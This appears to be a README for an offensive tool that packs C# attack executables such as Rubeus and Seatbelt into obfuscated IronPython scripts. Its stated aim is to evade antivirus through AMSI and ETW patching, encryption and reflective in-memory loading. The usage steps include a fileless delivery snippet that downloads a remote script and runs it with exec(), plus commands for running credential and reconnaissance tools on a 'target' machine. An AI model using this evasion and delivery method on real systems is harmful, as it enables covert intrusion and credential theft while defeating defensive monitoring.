### Invoke-Python-SharpPacker.py
--------------------------------------
'Invoke-Python-SharpPacker' allows to pack offensive C# .NET executables to bypass AV solutions such as Windows Defender.  
It generates obfuscated Python scripts, designed to run with IronPython (https://ironpython.net/), embedding a compressed and encrypted version of the offensive C# .NET payloads (exe) for stealthy execution via reflective code loading in-memory.  

<i/>Note: this is an improved version of the cool project 'IronSharpPack'</i>

#### FEATURES
  - Reflective C# assembly loading
  - C# assembly encryption (XOR) and compression (Zlib) 
  - AMSI bypass (patching method / AmsiScanBuffer function)
  - ETW bypass in user-mode (patching method / EtwEventWrite function)
  - Script obfuscation (Function and variable names are randomized + Nested payloads)

#### USAGE
  - STEP 1. Compile and then copy in the same directory all the offensive C# .NET executables that you want to pack (e.g. Rubeus.exe, Certify.exe, Seatbelt.exe) 
    
  - STEP 2. Download the latest version of Python 3 (www.python.org) and use it to generate obfuscated Python scripts that embed an encrypted version of the (C#) .NET executable files.  
```
C:\path-to-Python3\python-3.10.4> python.exe Invoke-Python-SharpPacker.py "C:\path-to-folder-containing-C#-exe-to-pack" 

Note: the packed python scripts will be created in the folder "C:\path-to-Python3\python-3.10.4\"
```
  - STEP 3. Multiple options exist to download & execute the obfuscated Python scripts on a target Windows computer

    - Option A: Download the latest version of IronPython 3 (https://ironpython.net/)  + Fileless delivery of the obfuscated Python scripts 
```
1 - Download the latest version of IronPython 3.4.2 on a target Windows machine.
    Example:
    PS C:\temp> wget -uri https://github.com/IronLanguages/ironpython3/releases/download/v3.4.2/IronPython.3.4.2.zip -OutFile C:\temp\IronPython.3.4.2.zip
    PS C:\temp> tar -xf .\IronPython.3.4.2.zip

2 - Download from a remote web server and execute directly in memory the obfuscated Python scripts (embeding the offensive C# .NET executables) on the target Windows machine using IronPython. 
    This fileless delivery technique enhances stealth and helps evade static antivirus detection. With AMSI and ETW patched, in-memory execution avoids runtime AV detection.
    Example:
    --------
    C:\temp\IronPython.3.4.2\Net462> type .\Python-fileless-delivery.py
    #Python3
    import urllib.request
    request = urllib.request.Request('http://website/Packed-Python-Script-Seatbelt.py')
    result = urllib.request.urlopen(request)
    payload = result.read()
    exec(payload)

    C:\temp\IronPython.3.4.2\Net462> ipy.exe .\Packed-Python-Script-Rubeus.py "logonsession /current /luid"
```
   - Option B: Download the latest version of IronPython 3 (https://ironpython.net/) + Download the obfuscated Python scripts (embeding the offensive C# .NET executables) locally before execution.
```
1 - Download the latest version of IronPython 3.4.2 on a target Windows machine.
    Example:
    PS C:\temp> wget -uri https://github.com/IronLanguages/ironpython3/releases/download/v3.4.2/IronPython.3.4.2.zip -OutFile C:\temp\IronPython.3.4.2.zip
    PS C:\temp> tar -xf .\IronPython.3.4.2.zip

2 - Download and store locally on disk the obfuscated Python scripts prior to execution with IronPython.
    The obfuscation and encryption help evade static analysis by most antivirus solutions, though this method may offer reduced stealth compared to in-memory execution.
    Example:
    --------
    C:\temp\IronPython.3.4.2\Net462> ipy.exe .\Packed-Python-Script-Seatbelt.py  "AMSIProviders"
```
  - Option C: Use IronPython to bundle the obfuscated Python scripts into executables (e.g. script.exe) and then download and execute them on a target Windows computer
    => Not working yet. When using a command like "ipyc.exe /main:Packed-rubeus.py /target:exe /out:Packed-rubeus /standalone", an executable file is generated but it does not work due to issues related to missing import modules.

#### LICENSE
  - GNU General Public License v3.0
